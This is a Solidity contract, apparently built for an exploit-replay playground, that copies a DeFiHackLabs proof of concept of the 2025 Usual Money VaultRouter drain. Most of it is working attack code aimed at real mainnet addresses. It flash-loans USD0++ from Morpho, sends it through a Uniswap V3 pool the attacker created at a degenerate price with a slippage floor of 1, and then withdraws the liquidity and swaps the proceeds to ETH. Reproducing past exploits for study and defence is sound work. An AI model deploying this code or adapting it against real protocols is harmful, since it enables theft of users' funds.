// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2025-05-UsualMoney).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (attacker = address(this); test/UsualMoney_exp.sol
// UsualMoney.testExploit() creates + seeds a Uniswap V3 pool, then flash-loans
// USD0++ from Morpho; the flash-loan callback `onMorphoFlashLoan` also lives
// on the test contract itself), so there is no standalone attack contract to
// deploy. This contract is a faithful, self-contained copy of that inline
// attack so the playground can deploy it and record run(). Logic and
// constants are copied verbatim from test/UsualMoney_exp.sol
// (UsualMoney.testExploit / onMorphoFlashLoan), with the pre-attack pool
// creation + Uniswap V3 mint (which needs the 10-wei sUSDS seed dealt via
// vm.deal-equivalent `setup.dealToken`) moved into a `prep()` entrypoint
// called from the config's `setup.steps` BEFORE the recorded attack --
// mirroring how the playground splits unrecorded pre-attack prep from the
// single recorded call.
//
// Root cause: Usual's VaultRouter.deposit() lets the CALLER choose both the
// ParaSwap route (`swapData`, here a directUniV3Swap into a pool the attacker
// just created and seeded at a degenerate price) and the slippage floor
// (`minTokensToReceive = 1`), so ~1.9M USD0 can be swapped for 9 wei of sUSDS
// through a pool the attacker owns -- and reclaimed right back out via
// decreaseLiquidity + collect.

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IWETH is IERC20 {
    function withdraw(uint256 wad) external;
}

interface ICurvePool {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy, address receiver) external returns (uint256);
}

interface INonfungiblePositionManager {
    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }
    function mint(MintParams calldata params) external payable returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);

    struct DecreaseLiquidityParams {
        uint256 tokenId;
        uint128 liquidity;
        uint256 amount0Min;
        uint256 amount1Min;
        uint256 deadline;
    }
    function decreaseLiquidity(DecreaseLiquidityParams calldata params) external payable returns (uint256 amount0, uint256 amount1);

    struct CollectParams {
        uint256 tokenId;
        address recipient;
        uint128 amount0Max;
        uint128 amount1Max;
    }
    function collect(CollectParams calldata params) external payable returns (uint256 amount0, uint256 amount1);

    function createAndInitializePoolIfNecessary(address token0, address token1, uint24 fee, uint160 sqrtPriceX96) external payable returns (address pool);
}

interface IMorphoBlue {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IParaSwapAugustus {}

interface IVaultRouter {
    function deposit(
        IParaSwapAugustus augustus,
        address tokenIn,
        uint256 amountIn,
        uint256 minTokensToReceive,
        uint256 minSharesToReceive,
        address receiver,
        bytes calldata swapData
    ) external payable returns (uint256 sharesReceived);
}

interface ISwapRouter {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }
    function exactInput(ExactInputParams calldata params) external payable returns (uint256 amountOut);
}

contract UsualMoneyDrain {
    uint256 private constant borrowAmount = 1899838465685386939269479;

    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant USD0Plus = IERC20(0x35D8949372D46B7a3D5A56006AE77B215fc69bC0);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant USD0 = IERC20(0x73A15FeD60Bf67631dC6cd7Bc5B6e8da8190aCF5);
    IERC20 constant sUSDS = IERC20(0xa3931d71877C0E7a3148CB7Eb4463524FEc27fbD);
    ICurvePool constant USD0USD0Pool = ICurvePool(0x1d08E7adC263CfC70b1BaBe6dC5Bb339c16Eec52);
    INonfungiblePositionManager constant UNI_V3_POS = INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    address constant UniV3_Router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    IVaultRouter constant VaultRouter = IVaultRouter(0xE033cb1bB400C0983fA60ce62f8eCDF6A16fcE09);
    IMorphoBlue constant morphoBlue = IMorphoBlue(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);

    // Pre-attack prep (called from the config's `setup.steps`, unrecorded):
    // create + initialize the degenerate USD0/sUSDS Uniswap V3 pool and mint a
    // dust liquidity position into it, using the 10-wei sUSDS the setup step
    // deals to this contract beforehand. Mirrors testExploit() lines
    // 49-69 of the original test (everything before the Morpho flash loan).
    function prep() external {
        sUSDS.approve(address(UNI_V3_POS), 10);
        UNI_V3_POS.createAndInitializePoolIfNecessary(address(USD0), address(sUSDS), 500, 181769597477799861);

        INonfungiblePositionManager.MintParams memory mintParams = INonfungiblePositionManager.MintParams({
            token0: address(USD0),
            token1: address(sUSDS),
            fee: 500,
            tickLower: -536050,
            tickUpper: -536040,
            amount0Desired: 0,
            amount1Desired: 10,
            amount0Min: 0,
            amount1Min: 0,
            recipient: address(this),
            deadline: 1748370729
        });
        UNI_V3_POS.mint(mintParams);
    }

    // Recorded attack: flash-loan USD0++ from Morpho and, in the callback,
    // round-trip it through the attacker-owned pool + Curve to extract profit.
    function run() external {
        morphoBlue.flashLoan(address(USD0Plus), borrowAmount, bytes(""));
    }

    function onMorphoFlashLoan(uint256, bytes calldata) external {
        USD0Plus.approve(address(VaultRouter), borrowAmount);
        USD0Plus.approve(address(morphoBlue), USD0Plus.balanceOf(address(this)));

        address augustus = 0xDEF171Fe48CF0115B1d80b88dc8eAB59176FEe57;
        address tokenIn = address(USD0Plus);
        uint256 amountIn = 1899838465685386939269479;

        VaultRouter.deposit(
            IParaSwapAugustus(augustus),
            tokenIn,
            amountIn,
            1,
            0,
            address(this),
            hex"a6886da9000000000000000000000000000000000000000000000000000000000000002000000000000000000000000073a15fed60bf67631dc6cd7bc5b6e8da8190acf5000000000000000000000000a3931d71877c0e7a3148cb7eb4463524fec27fbd000000000000000000000000e592427a0aece92de3edee1f18e0157c0586156400000000000000000000000000000000000000000001924e73188d44bfd301670000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000068360529000000000000000000000000e033cb1bb400c0983fa60ce62f8ecdf6a16fce090000000000000000000000000000000000000000000000000000000000000000000000000000000000000000e033cb1bb400c0983fa60ce62f8ecdf6a16fce0900000000000000000000000000000000000000000000000000000000000001c00000000000000000000000000000000000000000000000000000000000000220d3ba174c721349ff915ec624c071422a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002b73a15fed60bf67631dc6cd7bc5b6e8da8190acf50001f4a3931d71877c0e7a3148cb7eb4463524fec27fbd00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
        );

        UNI_V3_POS.decreaseLiquidity(INonfungiblePositionManager.DecreaseLiquidityParams({
            tokenId: 998318,
            liquidity: 8720452440564722,
            amount0Min: 0,
            amount1Min: 0,
            deadline: 1748370719
        }));

        UNI_V3_POS.collect(INonfungiblePositionManager.CollectParams({
            tokenId: 998318,
            recipient: address(this),
            amount0Max: type(uint128).max,
            amount1Max: type(uint128).max
        }));

        USD0.approve(address(USD0USD0Pool), USD0.balanceOf(address(this)));
        USD0USD0Pool.exchange(0, 1, USD0.balanceOf(address(this)), 0, address(this));
        USD0Plus.approve(address(morphoBlue), borrowAmount);
        USD0Plus.approve(address(USD0USD0Pool), 43847725777335611631336);
        USD0USD0Pool.exchange(1, 0, 43847725777335611631336, 0, address(this));

        USD0.approve(address(UniV3_Router), USD0.balanceOf(address(this)));

        ISwapRouter(payable(UniV3_Router)).exactInput(
            ISwapRouter.ExactInputParams({
                path: abi.encodePacked(address(USD0), uint24(100), address(USDC), uint24(500), address(WETH)),
                recipient: address(this),
                deadline: 1748370719,
                amountIn: 42973674683230843641696,
                amountOutMinimum: 0
            })
        );
        WETH.withdraw(WETH.balanceOf(address(this)));
    }

    receive() external payable {}
}
